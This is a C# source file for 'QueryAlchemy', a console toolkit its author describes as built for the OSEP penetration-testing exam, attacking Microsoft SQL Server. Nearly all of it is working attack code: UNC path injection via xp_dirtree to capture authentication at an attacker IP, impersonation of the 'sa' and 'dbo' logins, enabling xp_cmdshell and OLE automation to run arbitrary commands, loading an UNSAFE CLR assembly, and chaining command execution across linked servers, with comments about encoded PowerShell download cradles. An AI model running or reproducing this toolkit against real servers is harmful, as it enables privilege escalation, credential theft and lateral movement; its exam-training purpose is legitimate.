using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
//SQL exploitation toolkit for OSEP exam
namespace QueryAlchemy
{
    class Program
    {
        static void Main(string[] args)
        {
            //Read input from user, get target SQL server
            Console.WriteLine("QueryAlchemy: SQL exploitation toolkit for OSEP\n");
            Console.WriteLine("Author: Logan Elliott\n");
            Console.WriteLine("Enter FQDN of target SQL server");
            string sqlServer = Console.ReadLine();
            Console.WriteLine("Target SQL server set to: " + sqlServer);

            //Read input from user, get target DB
            Console.WriteLine("Enter name of database to target, default is 'master' since it always exists.");
            string database = Console.ReadLine();
            Console.WriteLine("Target database set to: " + database + "\n");

            //Get user args to select what module to run
            Console.WriteLine("Select a module to run");

            Console.WriteLine("Choose an option from the following list:");
            Console.WriteLine("\te - Enumerate");
            Console.WriteLine("\tu - Attempt UNC Path Injection");
            Console.WriteLine("\tp - Attempt Privilege Escalation via Login Impersonation");
            Console.WriteLine("\tc - Perform Code Execution");
            Console.WriteLine("\tl - Abuse SQL Links");
            Console.Write("Your option? ");

            switch (Console.ReadLine())
            {
                case "e":
                    Console.WriteLine($"Enumerating SQL Server");

                    String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                    SqlConnection con = new SqlConnection(conString); //provide connection string arg to constructor

                    try
                    {
                        con.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                        Console.WriteLine("Auth success!");
                    }
                    catch //if the auth connection fails we catch the error and print auth failed to console
                    {
                        Console.WriteLine("Auth failed");
                        Environment.Exit(0);
                    }

                    String querylogin = "SELECT SYSTEM_USER;"; //The SYSTEM_USER SQL variable contains the name of the SQL login for the current session. If we can execute the SQL command "SELECT SYSTEM_USER;", we should get the SQL login.
                    SqlCommand command = new SqlCommand(querylogin, con); //use the sqlcommand class to execute an arbitrary sql query and return the output to us
                    SqlDataReader reader = command.ExecuteReader(); //use SqlDataReader to read the returned query
                    reader.Read(); //call the read method to return result of query
                    Console.WriteLine("Logged in as: " + reader[0]); //access the returned query in the reader object via array indexing and print result to console
                    reader.Close(); //make sure to close this so we can execute sql queries in proper order, sql connection will be blocked if we don't invoke this

                    String queryuser = "SELECT USER_NAME();"; //query the user so we can figure out what domain user it is mapped to
                    command = new SqlCommand(queryuser, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("Mapped to user: " + reader[0]);
                    reader.Close();

                    String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');"; //Determine if a specific logon is a member of a server role
                    command = new SqlCommand(querypublicrole, con); //Here we are determining if member is part of 'public' role
                    reader = command.ExecuteReader();
                    reader.Read();
                    Int32 role = Int32.Parse(reader[0].ToString());
                    if (role == 1)
                    {
                        Console.WriteLine("User is a member of public role");
                    }
                    else
                    {
                        Console.WriteLine("User is NOT a member of public role");
                    }
                    reader.Close();

                    String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');"; //find out if member is part of sysadmin role
                    command = new SqlCommand(querysysadminrole, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    role = Int32.Parse(reader[0].ToString());
                    if (role == 1)
                    {
                        Console.WriteLine("User is a member of sysadmin role");
                    }
                    else
                    {
                        Console.WriteLine("User is NOT a member of sysadmin role");
                    }
                    reader.Close();

                    con.Close();
                    break;

                //UNC Path Injection
                case "u":
                    Console.WriteLine($"Attempting UNC Path Injection\n");

                    Console.WriteLine("Enter attacker machine IP, if UNC is successful SMB traffic will be sent from the target to this IP");
                    String attackIP = Console.ReadLine();

                    String UNCconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                    SqlConnection unccon = new SqlConnection(UNCconString); //provide connection string arg to constructor

                    try
                    {
                        unccon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                        Console.WriteLine("Auth success, performing UNC injection!");
                    }
                    catch //if the auth connection fails we catch the error and print auth failed to console
                    {
                        Console.WriteLine("Auth failed, stopping UNC path injection attempt.");
                        Environment.Exit(0);
                    }

                    String uncquery = "EXEC master..xp_dirtree \"\\\\" + attackIP + "\\\\test\";"; //execute xp_dirtree procedure via query
                    SqlCommand UNCcommand = new SqlCommand(uncquery, unccon);
                    SqlDataReader uncreader = UNCcommand.ExecuteReader();
                    uncreader.Close();

                    unccon.Close();
                    Console.WriteLine("UNC path injection completed, exiting...");
                    break;

                //Privilege Escalation
                case "p":
                    Console.WriteLine($"Attempting Privilege Escalation via Login Impersonation\n");

                    Console.WriteLine("Choose an option from the following list:");
                    Console.WriteLine("\ti - Check/Show logins that can be impersonated");
                    Console.WriteLine("\ts - Impersonate SA Login");
                    Console.WriteLine("\td - Impersonate DBO User");
                    Console.Write("Your option? ");


                    switch (Console.ReadLine())
                    {
                        case "i": //Check logins that can be impersonated
                            Console.WriteLine($"Checking logins that can be impersonated");
                            String impconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection impcon = new SqlConnection(impconString); //provide connection string arg to constructor

                            try
                            {
                                impcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success, listing logins that can be impersonated!\n");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed, stopping impersonation check, exiting...");
                                Environment.Exit(0);
                            }

                            String impquery = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                            SqlCommand impcommand = new SqlCommand(impquery, impcon);
                            SqlDataReader impreader = impcommand.ExecuteReader();

                            while (impreader.Read() == true) //while loop to show all logins that can be impersonated
                            {
                                Console.WriteLine("Logins that can be impersonated: " + impreader[0]);
                            }
                            impreader.Close();

                            impcon.Close();
                            break;

                        case "s": //Impersonate SA login
                            Console.WriteLine($"Impersonating SA Login\n");
                            String saconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection sacon = new SqlConnection(saconString); //provide connection string arg to constructor

                            try
                            {
                                sacon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }

                            String saqueryuser = "SELECT SYSTEM_USER;"; //The SYSTEM_USER SQL variable contains the name of the SQL login for the current session. If we can execute the SQL command "SELECT SYSTEM_USER;", we should get the SQL login.
                            Console.WriteLine("Before impersonation");
                            SqlCommand beforeSAcommand = new SqlCommand(saqueryuser, sacon); //use the sqlcommand class to execute an arbitrary sql query and return the output to us
                            SqlDataReader sareader = beforeSAcommand.ExecuteReader(); //use SqlDataReader to read the returned query
                            sareader.Read(); //call the read method to return result of query
                            Console.WriteLine("Executing in the context of: " + sareader[0]); //access the returned query in the reader object via array indexing and print result to console
                            sareader.Close(); //make sure to close this so we can execute sql queries in proper order, sql connection will be blocked if we don't invoke this

                            String saexecuteas = "EXECUTE AS LOGIN = 'sa';";

                            command = new SqlCommand(saexecuteas, sacon);
                            sareader = command.ExecuteReader();
                            sareader.Close();

                            Console.WriteLine("After impersonation");

                            command = new SqlCommand(saqueryuser, sacon);
                            sareader = command.ExecuteReader();
                            sareader.Read();
                            Console.WriteLine("Executing in the context of: " + sareader[0]);
                            sareader.Close();
                            sacon.Close();
                            break;

                        case "d": //Impersonate DBO user
                            Console.WriteLine($"Impersonating DBO User\n");
                            String dboconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection dbocon = new SqlConnection(dboconString); //provide connection string arg to constructor

                            try
                            {
                                dbocon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }

                            String dboqueryuser = "SELECT USER_NAME();"; //use this to query for user context after impersonation is performed
                            Console.WriteLine("Before impersonation");
                            SqlCommand beforedbocommand = new SqlCommand(dboqueryuser, dbocon); //use the sqlcommand class to execute an arbitrary sql query and return the output to us
                            SqlDataReader dboreader = beforedbocommand.ExecuteReader(); //use SqlDataReader to read the returned query
                            dboreader.Read(); //call the read method to return result of query
                            Console.WriteLine("Executing in the context of: " + dboreader[0]); //access the returned query in the reader object via array indexing and print result to console
                            dboreader.Close(); //make sure to close this so we can execute sql queries in proper order, sql connection will be blocked if we don't invoke this
                                            //switch to msdb database because TRUSTWORTHY property will be set in it
                            String dboexecuteas = "use msdb; EXECUTE AS USER = 'dbo';";

                            command = new SqlCommand(dboexecuteas, dbocon);
                            dboreader = command.ExecuteReader();
                            dboreader.Close();

                            Console.WriteLine("After impersonation");

                            command = new SqlCommand(dboqueryuser, dbocon);
                            dboreader = command.ExecuteReader();
                            dboreader.Read();
                            Console.WriteLine("Executing in the context of: " + dboreader[0]);
                            dboreader.Close();
                            dbocon.Close();

                            break;
                    }
                    break;

                case "c":
                    Console.WriteLine($"Performing Code Execution");

                    Console.WriteLine("Choose an option from the following list:");
                    Console.WriteLine("\txp - Perform Code Exec Using XP_CMDSHELL");
                    Console.WriteLine("\tole - Perform Code Exec Using OLE Stored Procedure");
                    Console.WriteLine("\tca - Perform Code Exec Using Custom Assembly (Under Development)");
                    Console.Write("Your option? ");

                    switch (Console.ReadLine())
                    {
                        case "xp": //Code exec via xp_cmdshell
                            Console.WriteLine($"Performing Code Exec Using XP_CMDSHELL\n");

                            //Get command to run from user input
                            Console.WriteLine("Enter a command to run, all commands will be run like this on SQL server 'EXEC xp_cmdshell $yourcmd'\n");
                            String userxpcmd = Console.ReadLine();
                            Console.WriteLine("Command received: " + userxpcmd);
                            Console.WriteLine("Executing...");

                            String xpconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection xpcon = new SqlConnection(xpconString); //provide connection string arg to constructor

                            try
                            {
                                xpcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }

                            String impersonateUser = "EXECUTE AS LOGIN = 'sa';"; //impersonate sa login, so we have sysadmin role privileges, thus allowing us to enable xp_cmdshell
                            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"; //enable xp_cmdshell
                            String execCmd = "EXEC xp_cmdshell '"+userxpcmd+"'"; //execute user input command via xp_cmdshell

                            SqlCommand xpcommand = new SqlCommand(impersonateUser, xpcon);
                            SqlDataReader xpreader = xpcommand.ExecuteReader();
                            xpreader.Close();

                            xpcommand = new SqlCommand(enable_xpcmd, xpcon);
                            xpreader = xpcommand.ExecuteReader();
                            xpreader.Close();

                            xpcommand = new SqlCommand(execCmd, xpcon);
                            xpreader = xpcommand.ExecuteReader();
                            xpreader.Read();
                            Console.WriteLine("Result of command is: " + xpreader[0]);
                            xpreader.Close();
                            xpcon.Close();

                            break;

                        case "ole": //Code exec via OLE stored procedure
                            Console.WriteLine($"Performing Code Exec Using OLE Stored Procedure\n");

                            //Get command to run from user input
                            Console.WriteLine("Enter a command to run, all commands will be run like this on SQL server via WSCRIPT shell 'cmd /c \"echo Test > C:\\Tools\\file.txt\"'\n");
                            String userolecmd = Console.ReadLine();
                            Console.WriteLine("Command received: " + userolecmd);
                            Console.WriteLine("Executing...");

                            String oleconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection olecon = new SqlConnection(oleconString); //provide connection string arg to constructor

                            try
                            {
                                olecon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }

                            String oleimpersonateUser = "EXECUTE AS LOGIN = 'sa';";
                            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;"; //need to enable Ole Automation Procedures
                            String oleexecCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \""+userolecmd+"\"';"; //instantiate wscript shell

                            SqlCommand olecommand = new SqlCommand(oleimpersonateUser, olecon);
                            SqlDataReader olereader = olecommand.ExecuteReader();
                            olereader.Close();

                            olecommand = new SqlCommand(enable_ole, olecon);
                            olereader = olecommand.ExecuteReader();
                            olereader.Close();

                            olecommand = new SqlCommand(oleexecCmd, olecon);
                            olereader = olecommand.ExecuteReader();
                            olereader.Read();
                            Console.WriteLine("Result of command is: " + olereader[0]);
                            Console.WriteLine("Result of '0' means the command ran successfully! :D");
                            olereader.Close();
                            olecon.Close();

                            break;

                        case "ca": //Code exec via custom assembly
                            Console.WriteLine($"Performing Code Exec Using Custom Assembly\n");
                            Console.WriteLine("This module will load a custom assembly into the SQL server without writing to disk\n");
                            Console.WriteLine("To load the assembly directly, the DLL file must be converted into a hex string using the PS1 script 'hexstring.ps1'\n");
                            Console.WriteLine("This hex string value should be stored in a txt file\n");

                            Console.WriteLine("Enter full path to txt file containing hex string value: ");
                            String hexpath = Console.ReadLine();
                            String hexfile = @"" + hexpath + "";
                            String hexvalue = File.ReadAllText(hexfile);
                            Console.WriteLine("\nHex value received, loading custom assembly...\n");

                            String caconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection cacon = new SqlConnection(caconString); //provide connection string arg to constructor

                            String caimpersonateUser = "EXECUTE AS LOGIN = 'sa';";
                            String caenable_options = "use msdb; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'clr enabled', 1; RECONFIGURE;EXEC sp_configure 'clr strict security', 0; RECONFIGURE;"; //need to disable CLR strict security using 'sa' database admin
                            //Here we load our assembly directly using hex string rep of our assembly NOTE THAT FOR THE HEXSTRING CREATED BY THE PS1 SCRIPT WE MADE, WE MUST PREPEND THE STRING WITH 0x BEFORE THE REST OF THE STRING OR IT WILL NOT WORK PROPERLY
                            String createAsm = "CREATE ASSEMBLY myAssembly FROM 0x"+hexvalue+" WITH PERMISSION_SET = UNSAFE";
                            String createPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]";
                            String caexecCmd = "Exec cmdExec 'whoami';"; //invoke the stored assembly we created earlier so it will execute our arbitrary commands

                            try
                            {
                                cacon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }


                            SqlCommand cacommand = new SqlCommand(caimpersonateUser, cacon);
                            SqlDataReader careader = cacommand.ExecuteReader();
                            careader.Close();

                            cacommand = new SqlCommand(caenable_options, cacon); //push our query to db to disable CLR strict security
                            careader = cacommand.ExecuteReader();
                            careader.Close();

                            command = new SqlCommand(createAsm, cacon);
                            careader = cacommand.ExecuteReader();
                            careader.Close();

                            cacommand = new SqlCommand(createPro, cacon);
                            careader = cacommand.ExecuteReader();
                            careader.Close();

                            cacommand = new SqlCommand(caexecCmd, cacon);
                            careader = cacommand.ExecuteReader();
                            careader.Read();
                            Console.WriteLine("Result of command is: " + careader[0]);
                            careader.Close();

                            cacon.Close();


                            break;
                    }
                    break;

                case "l":
                    Console.WriteLine($"Abusing SQL Links\n");

                    Console.WriteLine("Choose an option from the following list:");
                    Console.WriteLine("\tle - Enumerate List Of Linked SQL Servers");
                    Console.WriteLine("\tus - Enumerate User Info and Security Context");
                    Console.WriteLine("\tlv - Enumerate Version Info From Linked Server");
                    Console.WriteLine("\tlxp - Perform Code Execution On Linked Server Using XP_CMDSHELL");
                    Console.WriteLine("\tdle - Double Link: Enumerate List Of Linked SQL Servers");
                    Console.WriteLine("\tdus - Double Link: Enumerate User Info and Security Context From Linked Server");
                    Console.WriteLine("\tdxp - Double Link: Perform Code Execution From First Linked Server On Second Linked Server Using XP_CMDSHELL");
                    Console.Write("Your option? ");

                    switch (Console.ReadLine())
                    {
                        case "le": //Enumerate all SQL links from target
                            Console.WriteLine($"Finding All SQL Links On " + sqlServer);

                            String linkconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection linkcon = new SqlConnection(linkconString); //provide connection string arg to constructor

                            try
                            {
                                linkcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }


                            String linkexecCmd = "EXEC sp_linkedservers;"; //return list of linked SQL servers

                            SqlCommand linkcommand = new SqlCommand(linkexecCmd, linkcon);
                            SqlDataReader linkreader = linkcommand.ExecuteReader();

                            while (linkreader.Read())
                            {
                                Console.WriteLine("Linked SQL server: " + linkreader[0]);
                            }
                            linkreader.Close();

                            linkcon.Close();

                            break;

                        case "us": //Enumerate user info and security context
                            Console.WriteLine($"Enumerating User Info and Security Context\n");

                            Console.WriteLine("Enter name of SQL link, this should be the hostname or FQDN of linked server:\n");
                            String uslinkname = Console.ReadLine();
                            Console.WriteLine("Targeting Linked Server: " + uslinkname);


                            String usconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection uscon = new SqlConnection(usconString); //provide connection string arg to constructor

                            try
                            {
                                uscon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }


                            String usexecCmd = "select myuser from openquery(\""+uslinkname+"\", 'select SYSTEM_USER as myuser');"; //get user information and security context from the linked SQL server, careful to escape double quotes when specifying 'dc01' as the linked sql server to perform the query on
                            String uslocalCmd = "select SYSTEM_USER;";

                            SqlCommand uscommand = new SqlCommand(uslocalCmd, uscon);
                            SqlDataReader usreader = uscommand.ExecuteReader();

                            usreader.Read();
                            Console.WriteLine("Executing as the login " + usreader[0] + " on " + sqlServer);
                            usreader.Close();

                            uscommand = new SqlCommand(usexecCmd, uscon);
                            usreader = uscommand.ExecuteReader();

                            usreader.Read();
                            Console.WriteLine("Executing as the login " + usreader[0] + " on "+ uslinkname);
                            usreader.Close();

                            uscon.Close();

                            break;

                        case "lv":
                            Console.WriteLine($"Enumerating Version Info From Linked SQL Server\n");

                            Console.WriteLine("Enter name of SQL link, this should be the hostname or FQDN of linked server:\n");
                            String lvlinkname = Console.ReadLine();
                            Console.WriteLine("Targeting Linked Server: " + lvlinkname);

                            String lvconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection lvcon = new SqlConnection(lvconString); //provide connection string arg to constructor

                            try
                            {
                                lvcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }


                            String lvexecCmd = "select version from openquery(\"" + lvlinkname + "\", 'select @@version as version');"; //get the version information from the linked SQL server, careful to escape double quotes when specifying 'dc01' as the linked sql server to perform the query on

                            SqlCommand lvcommand = new SqlCommand(lvexecCmd, lvcon);
                            SqlDataReader lvreader = lvcommand.ExecuteReader();

                            while (lvreader.Read())
                            {
                                Console.WriteLine("Linked SQL server version: \n" + lvreader[0]);
                            }
                            lvreader.Close();

                            lvcon.Close();

                            break;

                        case "lxp":
                            Console.WriteLine($"Performing Code Exec On Linked Server Using XP_CMDSHELL\n");

                            Console.WriteLine("Enter name of SQL link, this should be the hostname or FQDN of linked server:\n");
                            String lxplinkname = Console.ReadLine();
                            Console.WriteLine("Targeting Linked Server: " + lxplinkname +"\n");

                            //Get command to run from user input
                            Console.WriteLine("Enter a command to run, all commands will be run like this on SQL server 'EXEC xp_cmdshell $yourcmd'\n");
                            String userlxpcmd = Console.ReadLine();
                            Console.WriteLine("Command received: " + userlxpcmd);
                            Console.WriteLine("Executing...");

                            String lxpconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection lxpcon = new SqlConnection(lxpconString); //provide connection string arg to constructor

                            try
                            {
                                lxpcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }

                            String lxpenableadvoptions = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT "+lxplinkname;
                            String lxpenablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "+lxplinkname; //enable xp_cmdshell so we can perform cmd exec on linked sql server
                            //This part was the trickiest, getting the b64 encoded PS download cradle to be properly escaped, refer to this link for help https://notes.qazeer.io/l7/methodology-14 
                            String lxpexecCmd = "EXEC ('xp_cmdshell ''"+userlxpcmd+"''') AT "+lxplinkname;


                            SqlCommand lxpcommand = new SqlCommand(lxpenableadvoptions, lxpcon);
                            SqlDataReader lxpreader = lxpcommand.ExecuteReader();
                            lxpreader.Close();

                            lxpcommand = new SqlCommand(lxpenablexpcmdshell, lxpcon);
                            lxpreader = lxpcommand.ExecuteReader();
                            lxpreader.Close();

                            lxpcommand = new SqlCommand(lxpexecCmd, lxpcon);
                            lxpreader = lxpcommand.ExecuteReader();
                            //Console.WriteLine("Result of command is: " + lxpreader[0]);
                            lxpreader.Close();

                            lxpcon.Close();

                            break;

                        case "dle":
                            Console.WriteLine($"Enumerating List Of Linked Servers From Linked Server\n");
                            Console.WriteLine("This module will find all of the links on a linked server\n");
                            Console.WriteLine("Example: EXEC ('sp_linkedservers') AT DC01;\n");

                            //Get user input
                            Console.WriteLine("Enter name of SQL link, this should be the hostname or FQDN of linked server:\n");
                            String dlelinkname = Console.ReadLine();
                            Console.WriteLine("Targeting Linked Server: " + dlelinkname + "\n");

                            String dleconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection dlecon = new SqlConnection(dleconString); //provide connection string arg to constructor

                            try
                            {
                                dlecon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }

                            String dleexecCmd = "EXEC ('sp_linkedservers') AT "+dlelinkname+";";

                            SqlCommand dlecommand = new SqlCommand(dleexecCmd, dlecon);
                            SqlDataReader dlereader = dlecommand.ExecuteReader();

                            while (dlereader.Read())
                            {
                                Console.WriteLine("Linked SQL Server: " + dlereader[0]);
                            }

                            dlereader.Close();

                            dlecon.Close();

                            break;

                        case "dus":
                            Console.WriteLine($"Enumerating User Info and Security Context From Double Linked Server\n");
                            Console.WriteLine("This module enumerates user info over a link from one SQL server to another.\n");
                            Console.WriteLine("Example: select mylogin from openquery(\"dc01\", 'select mylogin from openquery(\"appsrv01\", ''select SYSTEM_USER as mylogin'')');\n");

                            Console.WriteLine("Enter name of first SQL link, this should be the hostname or FQDN of linked server:\n");
                            String duslinkname = Console.ReadLine();
                            Console.WriteLine("First Linked Server Set To: " + duslinkname + "\n");

                            Console.WriteLine("Enter name of second SQL link, this is where the enumeration will occur, but it will be performed from the first linked server.\n");
                            String dussecondlinkname = Console.ReadLine();
                            Console.WriteLine("Targeting Second Linked Server: " + dussecondlinkname + "\n");


                            String dusconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection duscon = new SqlConnection(dusconString); //provide connection string arg to constructor

                            try
                            {
                                duscon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }

                            String dusexecCmd = "select mylogin from openquery(\""+duslinkname+"\", 'select mylogin from openquery(\""+dussecondlinkname+"\", ''select SYSTEM_USER as mylogin'')'); "; //get user information and security context from the linked SQL server, careful to escape double quotes when specifying 'dc01' as the linked sql server to perform the query on

                            SqlCommand duscommand = new SqlCommand(dusexecCmd, duscon);
                            SqlDataReader dusreader = duscommand.ExecuteReader();

                            while (dusreader.Read())
                            {
                                Console.WriteLine("Executing as the login " + dusreader[0] + " on: "+dussecondlinkname);
                            }
                            dusreader.Close();

                            duscon.Close();
                            break;

                        case "dxp":
                            Console.WriteLine($"Performing Code Execution From First Linked Server On Second Linked Server Using XP_CMDSHELL\n");
                            Console.WriteLine("Example: EXEC ('EXEC (''xp_cmdshell ''''powershell -enc KABOA'''';'') AT appsrv01') AT DC01\n");
                            Console.WriteLine("In the example above this would cause the B64 encoded powershell payload to run on APPSRV01 abusing the first link from DC01\n");

                            Console.WriteLine("Enter name of first SQL link, this should be the hostname or FQDN of linked server:\n");
                            String dxplinkname = Console.ReadLine();
                            Console.WriteLine("First Linked Server Set To: " + dxplinkname + "\n");

                            Console.WriteLine("Enter name of second SQL link, this is where the code exec will occur, but it will be performed from the first linked server.\n");
                            String dxpsecondlinkname = Console.ReadLine();
                            Console.WriteLine("Targeting Second Linked Server: " + dxpsecondlinkname + "\n");

                            Console.WriteLine("Enter a command to run on second linked server, all commands will be run like this on second SQL server 'EXEC xp_cmdshell $yourcmd'\n");
                            String userdxpcmd = Console.ReadLine();
                            Console.WriteLine("Command received: " + userdxpcmd);
                            Console.WriteLine("Executing...\n");


                            String dxpconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
                            SqlConnection dxpcon = new SqlConnection(dxpconString); //provide connection string arg to constructor

                            try
                            {
                                dxpcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
                                Console.WriteLine("Auth success!");
                            }
                            catch //if the auth connection fails we catch the error and print auth failed to console
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }
                            //THIS IS THE MOST IMPORTANT PART TO MAKE THIS ESCALATION WORK, ALL SINGLE QUOTES USED MUST BE DOUBLED BECAUSE WE ARE LINKING FROM ONE SQL SERVER BACK TO OUR HOME SQL SERVER SO DOUBLE IS NEEDED
                            String dxpenableadvoptions = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT "+dxpsecondlinkname+"') AT "+dxplinkname+"";
                            String dxpenablexpcmdshell = "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT "+dxpsecondlinkname+"') AT "+dxplinkname+""; //enable xp_cmdshell so we can perform cmd exec on linked sql server
                            //This part was the trickiest, getting the b64 encoded PS download cradle to be properly escaped, refer to this link for help https://notes.qazeer.io/l7/methodology-14 
                            String dxpexecCmd = "EXEC ('EXEC (''xp_cmdshell ''''"+userdxpcmd+"'''';'') AT "+dxpsecondlinkname+"') AT "+dxplinkname+"";


                            SqlCommand dxpcommand = new SqlCommand(dxpenableadvoptions, dxpcon);
                            SqlDataReader dxpreader = dxpcommand.ExecuteReader();
                            dxpreader.Close();

                            dxpcommand = new SqlCommand(dxpenablexpcmdshell, dxpcon);
                            dxpreader = dxpcommand.ExecuteReader();
                            dxpreader.Close();

                            dxpcommand = new SqlCommand(dxpexecCmd, dxpcon);
                            dxpreader = dxpcommand.ExecuteReader();
                            dxpreader.Close();

                            dxpcon.Close();

                            break;
                    }

                    break;
            }
        }
    }
}
